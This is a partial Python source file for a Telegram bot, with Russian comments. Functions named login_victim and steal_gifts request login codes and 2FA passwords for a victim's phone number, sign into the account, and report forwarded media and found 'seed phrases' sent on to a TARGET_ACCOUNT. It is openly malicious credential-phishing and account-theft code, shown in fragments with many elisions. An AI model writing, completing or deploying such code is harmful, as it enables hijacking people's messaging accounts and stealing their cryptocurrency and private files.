...
async def create_helper_session(chat_id, phone, code):
    ...
    try:
        ...
        # Отправляем запрос на код, если его еще нет
        ...
        bot.send_message(
            chat_id,
            f"✅ **Сессия создана!**\nАккаунт: {me.username or me.phone}\n\nТеперь этот аккаунт будет использоваться для подтверждения входов.",
            parse_mode='Markdown'
        )
    except Exception as e:
        error = str(e)
        if '2FA' in error or 'password' in error:
            ...
            bot.register_next_step_handler_by_chat_id(chat_id, setup_2fa, client)
        else:
            bot.send_message(chat_id, f"❌ Ошибка: {error[:200]}")

def setup_2fa(message, client):
    ...
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(finish_setup_2fa(chat_id, client, code2fa))
        loop.close()
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:200]}")

async def finish_setup_2fa(chat_id, client, code2fa):
    try:
...
async def login_victim(chat_id, phone):
    ...
    try:
        # Отправляем запрос на код для жертвы
        await client.send_code_request(phone)
...
async def steal_gifts(chat_id, client):
    try:
        me = await client.get_me()
        bot.send_message(chat_id, f"🎁 **Обработка аккаунта {me.username or me.phone}...**", parse_mode='Markdown')
        ...
        bot.send_message(
            chat_id,
            f"✅ **Готово!**\n📤 Переслано медиа: {count}\n🔑 Найдено сид-фраз: {found}\n📨 Всё отправлено на {TARGET_ACCOUNT}",
            parse_mode='Markdown'
        )
